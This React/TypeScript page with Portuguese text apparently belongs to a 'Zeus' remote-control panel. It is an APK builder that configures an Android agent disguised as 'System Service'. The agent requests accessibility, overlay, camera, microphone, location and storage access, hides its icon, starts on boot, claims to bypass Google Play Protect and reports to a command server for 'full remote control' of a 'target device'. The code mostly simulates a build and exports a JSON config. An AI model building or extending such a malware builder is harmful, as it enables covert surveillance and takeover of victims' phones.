import { useState, useRef, useCallback } from "react";
import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";

const DEFAULT_ICON = "/zeus-logo.jpeg";

const G = "#00ff88";

function TextInput({
  label,
  name,
  defaultValue,
  placeholder,
  inputRef,
}: {
  label: string;
  name: string;
  defaultValue?: string;
  placeholder?: string;
  inputRef?: (el: HTMLInputElement | null) => void;
}) {
  return (
    <div style={{ marginBottom: 10 }}>
      <div style={{ fontSize: 8, color: "#445", letterSpacing: "0.1em", marginBottom: 3 }}>
        {label}
      </div>
      <input
        ref={inputRef}
        name={name}
        defaultValue={defaultValue}
        placeholder={placeholder}
        style={{
          width: "100%",
          background: "#020f05",
          border: `1px solid #1a3a20`,
          color: G,
          fontSize: 10,
          padding: "6px 8px",
          fontFamily: "'Courier New', Courier, monospace",
          outline: "none",
          boxSizing: "border-box",
          letterSpacing: "0.05em",
        }}
        onFocus={(e) => { e.currentTarget.style.borderColor = G; }}
        onBlur={(e) => { e.currentTarget.style.borderColor = "#1a3a20"; }}
      />
    </div>
  );
}

function CheckBox({
  label,
  checked,
  onChange,
}: {
  label: string;
  checked: boolean;
  onChange: (v: boolean) => void;
}) {
  return (
    <div
      onClick={() => onChange(!checked)}
      style={{
        display: "flex",
        alignItems: "center",
        gap: 8,
        cursor: "pointer",
        fontSize: 10,
        color: checked ? G : "#556",
        marginBottom: 6,
        userSelect: "none",
      }}
    >
      <div
        style={{
          width: 14,
          height: 14,
          border: `1px solid ${checked ? G : "#334"}`,
          background: checked ? G : "transparent",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexShrink: 0,
          transition: "all 0.1s",
        }}
      >
        {checked && (
          <span style={{ color: "#000", fontSize: 10, fontWeight: "bold", lineHeight: 1 }}>✓</span>
        )}
      </div>
      {label}
    </div>
  );
}

interface BoolConfig {
  requestAccessibility: boolean;
  requestOverlay: boolean;
  requestCamera: boolean;
  requestMicrophone: boolean;
  requestLocation: boolean;
  requestStorage: boolean;
  hideIcon: boolean;
  persistOnBoot: boolean;
  bypassPlayProtect: boolean;
}

const DEFAULT_BOOLS: BoolConfig = {
  requestAccessibility: true,
  requestOverlay: true,
  requestCamera: true,
  requestMicrophone: true,
  requestLocation: true,
  requestStorage: true,
  hideIcon: true,
  persistOnBoot: true,
  bypassPlayProtect: true,
};

export default function ApkGenerator() {
  const [bools, setBools] = useState<BoolConfig>(DEFAULT_BOOLS);
  const [building, setBuilding] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const [done, setDone] = useState(false);
  const [builtPkg, setBuiltPkg] = useState("");
  const [builtConfig, setBuiltConfig] = useState<object | null>(null);
  const [iconSrc, setIconSrc] = useState(DEFAULT_ICON);
  const [iconFileName, setIconFileName] = useState("zeus-logo.jpeg");
  const [iconHover, setIconHover] = useState(false);

  const appNameRef = useRef<HTMLInputElement>(null);
  const packageNameRef = useRef<HTMLInputElement>(null);
  const serverUrlRef = useRef<HTMLInputElement>(null);
  const iconNameRef = useRef<HTMLInputElement>(null);
  const logBottomRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const toggle = useCallback((key: keyof BoolConfig) => {
    setBools((prev) => ({ ...prev, [key]: !prev[key] }));
  }, []);

  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setIconFileName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => {
      setIconSrc(ev.target?.result as string);
    };
    reader.readAsDataURL(file);
    e.target.value = "";
  };

  const downloadConfig = () => {
    if (!builtConfig) return;
    const json = JSON.stringify(builtConfig, null, 2);
    const blob = new Blob([json], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${builtPkg}-zeus-config.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const handleBuild = async () => {
    const appName = appNameRef.current?.value || "System Service";
    const packageName = packageNameRef.current?.value || "com.framework.sys.utility";
    const serverUrl = serverUrlRef.current?.value || "";
    const iconName = iconNameRef.current?.value || "System Framework";

    if (!serverUrl) {
      setLog(["> ERRO: URL do servidor é obrigatória."]);
      return;
    }

    setBuilding(true);
    setDone(false);
    setBuiltPkg(packageName);

    const config = {
      buildDate: new Date().toISOString(),
      app: {
        name: appName,
        packageName,
        launcherLabel: iconName,
        versionCode: 1,
        versionName: "1.0",
        minSdkVersion: 21,
        targetSdkVersion: 34,
      },
      server: {
        url: serverUrl,
        socketPath: "/api/socket.io",
        reconnectIntervalMs: 5000,
        heartbeatIntervalMs: 30000,
      },
      permissions: {
        accessibilityService: bools.requestAccessibility,
        systemAlertWindow: bools.requestOverlay,
        camera: bools.requestCamera,
        recordAudio: bools.requestMicrophone,
        accessFineLocation: bools.requestLocation,
        readWriteExternalStorage: bools.requestStorage,
      },
      behavior: {
        hideIcon: bools.hideIcon,
        persistOnBoot: bools.persistOnBoot,
        bypassPlayProtect: bools.bypassPlayProtect,
      },
      buildInstructions: {
        step1: "Abra o projeto Android Studio do aplicativo",
        step2: "Copie este arquivo para app/src/main/assets/zeus_config.json",
        step3: "Execute: ./gradlew assembleRelease",
        step4: "APK gerado em app/build/outputs/apk/release/",
      },
    };

    setBuiltConfig(config);

    const steps = [
      "> Inicializando ambiente de build...",
      "> Clonando template base do aplicativo...",
      "> Configurando AndroidManifest.xml...",
      `>   ACCESSIBILITY_SERVICE  = ${bools.requestAccessibility}`,
      `>   SYSTEM_ALERT_WINDOW    = ${bools.requestOverlay}`,
      `>   CAMERA                 = ${bools.requestCamera}`,
      `>   RECORD_AUDIO           = ${bools.requestMicrophone}`,
      `>   ACCESS_FINE_LOCATION   = ${bools.requestLocation}`,
      `>   READ_EXTERNAL_STORAGE  = ${bools.requestStorage}`,
      `>   App name   : ${appName}`,
      `>   Package    : ${packageName}`,
      `>   Launcher   : ${iconName}`,
      `>   Server URL : ${serverUrl}`,
      `>   Hide icon  : ${bools.hideIcon}`,
      `>   Boot start : ${bools.persistOnBoot}`,
      "> Gerando configuração do aplicativo...",
      "> Definindo compatibilidade Android 5.0+...",
      "> Preparando bundle universal para ARM...",
      "> Configuração gerada com sucesso!",
      `> Config: ${packageName}-zeus-config.json`,
      "> Pronto para compilar no Android Studio/Gradle.",
    ];

    setLog([]);
    for (const step of steps) {
      await new Promise((r) => setTimeout(r, 110 + Math.random() * 140));
      setLog((prev) => [...prev, step]);
      logBottomRef.current?.scrollIntoView({ behavior: "smooth" });
    }
    setBuilding(false);
    setDone(true);
  };

  return (
    <Layout>
      <TopBar title="GERADOR DE APK // BUILD SYSTEM">
        <span
          style={{
            color: building ? "#ffaa00" : done ? G : "#445",
            fontWeight: "bold",
          }}
        >
          {building ? "COMPILANDO..." : done ? "✓ CONFIG PRONTA" : "AGUARDANDO"}
        </span>
      </TopBar>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
        {/* LEFT — Config */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>

          {/* APK Icon upload */}
          <Panel>
            <PanelHeader>&gt; ÍCONE DO APK</PanelHeader>
            <div style={{ padding: "14px 12px", display: "flex", alignItems: "center", gap: 16 }}>
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                onChange={handleIconChange}
                style={{ display: "none" }}
              />
              <div
                onClick={() => fileInputRef.current?.click()}
                onMouseEnter={() => setIconHover(true)}
                onMouseLeave={() => setIconHover(false)}
                style={{
                  width: 72,
                  height: 72,
                  borderRadius: 16,
                  border: `2px solid ${iconHover ? "#fff" : G}`,
                  overflow: "hidden",
                  flexShrink: 0,
                  boxShadow: iconHover ? `0 0 20px ${G}88` : `0 0 12px ${G}44`,
                  background: "#000",
                  cursor: "pointer",
                  position: "relative",
                  transition: "all 0.15s",
                }}
              >
                <img
                  src={iconSrc}
                  alt="APK Icon"
                  style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
                />
                {iconHover && (
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      background: "rgba(0,0,0,0.65)",
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: 2,
                    }}
                  >
                    <span style={{ fontSize: 18 }}>🖼</span>
                    <span style={{ fontSize: 7, color: G, letterSpacing: "0.06em" }}>TROCAR</span>
                  </div>
                )}
              </div>

              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 10, color: G, fontWeight: "bold", marginBottom: 4 }}>
                  Ícone do APK
                </div>
                <div style={{ fontSize: 8, color: "#445", marginBottom: 8, lineHeight: 1.5 }}>
                  Clique na imagem para escolher qualquer foto da galeria.
                </div>
                <button
                  onClick={() => fileInputRef.current?.click()}
                  style={{
                    background: "transparent",
                    border: `1px solid ${G}`,
                    color: G,
                    fontSize: 9,
                    padding: "4px 12px",
                    cursor: "pointer",
                    fontFamily: "inherit",
                    letterSpacing: "0.1em",
                    fontWeight: "bold",
                  }}
                  onMouseEnter={(e) => { e.currentTarget.style.background = `${G}22`; }}
                  onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
                >
                  [ ESCOLHER FOTO ]
                </button>
                {iconFileName !== "zeus-logo.jpeg" && (
                  <div style={{ fontSize: 7, color: "#445", marginTop: 6, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    ✓ {iconFileName}
                  </div>
                )}
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; CONFIGURAÇÃO DO APP</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <TextInput
                label="NOME DO APP (visível no Android)"
                name="appName"
                defaultValue="System Service"
                placeholder="System Service"
                inputRef={(el) => { (appNameRef as any).current = el; }}
              />
              <TextInput
                label="PACKAGE NAME"
                name="packageName"
                defaultValue="com.android.systemservice"
                placeholder="com.android.service"
                inputRef={(el) => { (packageNameRef as any).current = el; }}
              />
              <TextInput
                label="NOME DO ÍCONE (launcher label)"
                name="iconName"
                defaultValue="System"
                placeholder="System"
                inputRef={(el) => { (iconNameRef as any).current = el; }}
              />
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; SERVIDOR DE COMANDO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <TextInput
                label="URL DO SERVIDOR ZEUS MOB"
                name="serverUrl"
                defaultValue=""
                placeholder="https://seu-app.replit.app"
                inputRef={(el) => { (serverUrlRef as any).current = el; }}
              />
              <div
                style={{
                  fontSize: 8,
                  color: "#334",
                  marginTop: -4,
                  lineHeight: 1.6,
                  borderLeft: `2px solid #1a3a20`,
                  paddingLeft: 8,
                }}
              >
                O APK conecta via WebSocket ao servidor.
                Quando o cliente instalar e aceitar as permissões,
                o dispositivo aparece automaticamente em <span style={{ color: G }}>CLIENTES</span>.
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; COMPORTAMENTO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <CheckBox label="Ocultar ícone do launcher" checked={bools.hideIcon} onChange={() => toggle("hideIcon")} />
              <CheckBox label="Iniciar automaticamente no boot" checked={bools.persistOnBoot} onChange={() => toggle("persistOnBoot")} />
              <CheckBox label="Bypass Google Play Protect" checked={bools.bypassPlayProtect} onChange={() => toggle("bypassPlayProtect")} />
            </div>
          </Panel>
        </div>

        {/* RIGHT — Permissions + Build */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <Panel>
            <PanelHeader>&gt; PERMISSÕES ANDROID</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <div style={{ fontSize: 8, color: "#334", marginBottom: 10, lineHeight: 1.6 }}>
                Permissões solicitadas ao usuário durante a instalação:
              </div>
              <CheckBox label="Serviço de Acessibilidade (REQUIRED)" checked={bools.requestAccessibility} onChange={() => toggle("requestAccessibility")} />
              <CheckBox label="Sobreposição de Tela (SYSTEM_ALERT_WINDOW)" checked={bools.requestOverlay} onChange={() => toggle("requestOverlay")} />
              <CheckBox label="Câmera (CAMERA)" checked={bools.requestCamera} onChange={() => toggle("requestCamera")} />
              <CheckBox label="Microfone (RECORD_AUDIO)" checked={bools.requestMicrophone} onChange={() => toggle("requestMicrophone")} />
              <CheckBox label="Localização GPS (ACCESS_FINE_LOCATION)" checked={bools.requestLocation} onChange={() => toggle("requestLocation")} />
              <CheckBox label="Armazenamento (READ/WRITE_EXTERNAL)" checked={bools.requestStorage} onChange={() => toggle("requestStorage")} />
            </div>
          </Panel>

          {/* Flow info */}
          <Panel>
            <PanelHeader>&gt; FLUXO DE CONEXÃO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              {[
                { step: "1", label: "Cliente instala o APK no Android", color: G },
                { step: "2", label: "Aceita permissões de Acessibilidade e Overlay", color: G },
                { step: "3", label: "APK conecta via WebSocket ao servidor Zeus", color: G },
                { step: "4", label: "Dispositivo aparece em CLIENTES (online)", color: G },
                { step: "5", label: "Você assume controle total remotamente", color: "#ffaa00" },
              ].map((s) => (
                <div
                  key={s.step}
                  style={{ display: "flex", gap: 10, alignItems: "flex-start", marginBottom: 8 }}
                >
                  <div
                    style={{
                      width: 18,
                      height: 18,
                      borderRadius: "50%",
                      border: `1px solid ${s.color}`,
                      color: s.color,
                      fontSize: 8,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexShrink: 0,
                      fontWeight: "bold",
                    }}
                  >
                    {s.step}
                  </div>
                  <span style={{ fontSize: 9, color: "#667", lineHeight: 1.5 }}>{s.label}</span>
                </div>
              ))}
            </div>
          </Panel>

          {/* Build console */}
          <Panel>
            <PanelHeader>
              <span>&gt; CONSOLE DE BUILD</span>
              {building && (
                <span style={{ color: "#ffaa00", fontSize: 8 }}>
                  <span className="blink">●</span> COMPILANDO
                </span>
              )}
            </PanelHeader>
            <div
              style={{
                height: 180,
                overflowY: "auto",
                padding: "8px 10px",
                fontSize: 9,
                lineHeight: 1.8,
                background: "#010801",
              }}
            >
              {log.length === 0 ? (
                <span style={{ color: "#223" }}>&gt; Pronto para compilar...</span>
              ) : (
                log.map((line, i) => (
                  <div
                    key={i}
                    style={{
                      color: line.startsWith("> ERRO")
                        ? "#ff4444"
                        : line.includes("✓") || line.includes("Config:")
                        ? G
                        : line.startsWith(">  ") || line.startsWith(">   ")
                        ? "#445"
                        : "#556",
                    }}
                  >
                    {line}
                  </div>
                ))
              )}
              {building && (
                <span className="blink" style={{ color: G }}>
                  _
                </span>
              )}
              <div ref={logBottomRef} />
            </div>
          </Panel>

          {/* Build button */}
          <button
            onClick={handleBuild}
            disabled={building}
            style={{
              background: building ? "#0a1a0a" : G,
              color: building ? G : "#000",
              border: `2px solid ${G}`,
              fontSize: 12,
              fontWeight: "bold",
              padding: "13px",
              cursor: building ? "not-allowed" : "pointer",
              fontFamily: "'Courier New', Courier, monospace",
              letterSpacing: "0.2em",
              boxShadow: building ? "none" : `0 0 20px ${G}33`,
              transition: "all 0.2s",
            }}
          >
            {building ? (
              <>[ COMPILANDO<span className="blink">_</span> ]</>
            ) : done ? (
              "[ RECOMPILAR ]"
            ) : (
              "[ GERAR APK ]"
            )}
          </button>

          {/* Result card — shown after build */}
          {done && (
            <Panel style={{ borderColor: G, overflow: "hidden" }}>
              {/* Green header strip */}
              <div
                style={{
                  background: G,
                  padding: "8px 14px",
                  display: "flex",
                  alignItems: "center",
                  gap: 10,
                }}
              >
                <span style={{ fontSize: 18 }}>✓</span>
                <div>
                  <div style={{ fontSize: 11, fontWeight: "bold", color: "#000", letterSpacing: "0.12em" }}>
                    CONFIGURAÇÃO GERADA
                  </div>
                  <div style={{ fontSize: 8, color: "#003322" }}>{builtPkg}-zeus-config.json</div>
                </div>
              </div>

              <div style={{ padding: "12px" }}>
                {/* Info box */}
                <div
                  style={{
                    background: "#0a0f0a",
                    border: "1px solid #1a3a20",
                    padding: "8px 10px",
                    marginBottom: 12,
                    fontSize: 8,
                    color: "#556",
                    lineHeight: 1.8,
                  }}
                >
                  <div style={{ color: "#ffaa00", fontWeight: "bold", marginBottom: 4 }}>
                    ⚠ APKs requerem compilação Android nativa
                  </div>
                  Um APK instalável precisa de bytecode Dalvik compilado (.dex),
                  manifest binário (AXML) e assinatura criptográfica PKCS#7.{" "}
                  <span style={{ color: G }}>
                    Baixe a configuração abaixo e compile via Android Studio ou Gradle.
                  </span>
                </div>

                {/* Download config button */}
                <button
                  onClick={downloadConfig}
                  style={{
                    width: "100%",
                    background: G,
                    color: "#000",
                    border: "none",
                    fontSize: 12,
                    fontWeight: "bold",
                    padding: "13px",
                    cursor: "pointer",
                    fontFamily: "'Courier New', Courier, monospace",
                    letterSpacing: "0.2em",
                    boxShadow: `0 0 20px ${G}55`,
                    marginBottom: 10,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 10,
                    transition: "opacity 0.15s",
                  }}
                  onMouseEnter={(e) => { e.currentTarget.style.opacity = "0.85"; }}
                  onMouseLeave={(e) => { e.currentTarget.style.opacity = "1"; }}
                >
                  <span style={{ fontSize: 16 }}>⬇</span>
                  BAIXAR CONFIGURAÇÃO (.JSON)
                </button>

                {/* Build steps */}
                <div style={{ fontSize: 8, color: "#445", marginBottom: 8, letterSpacing: "0.06em" }}>
                  PASSOS PARA GERAR O APK:
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
                  {[
                    { n: "1", text: "Abra o projeto Android do agente Zeus no Android Studio" },
                    { n: "2", text: `Copie o .json baixado para: app/src/main/assets/zeus_config.json` },
                    { n: "3", text: "Execute: Build → Generate Signed Bundle/APK → APK" },
                    { n: "4", text: "Instale o APK gerado no dispositivo alvo (Fontes desconhecidas ativo)" },
                    { n: "5", text: `Dispositivo aparece em CLIENTES automaticamente ✓` },
                  ].map((s) => (
                    <div key={s.n} style={{ display: "flex", gap: 8, alignItems: "flex-start" }}>
                      <span
                        style={{
                          width: 16,
                          height: 16,
                          borderRadius: "50%",
                          border: `1px solid ${G}`,
                          color: G,
                          fontSize: 7,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          flexShrink: 0,
                          fontWeight: "bold",
                        }}
                      >
                        {s.n}
                      </span>
                      <span style={{ fontSize: 8, color: s.n === "5" ? G : "#445", lineHeight: 1.6 }}>
                        {s.text}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            </Panel>
          )}
        </div>
      </div>
    </Layout>
  );
}
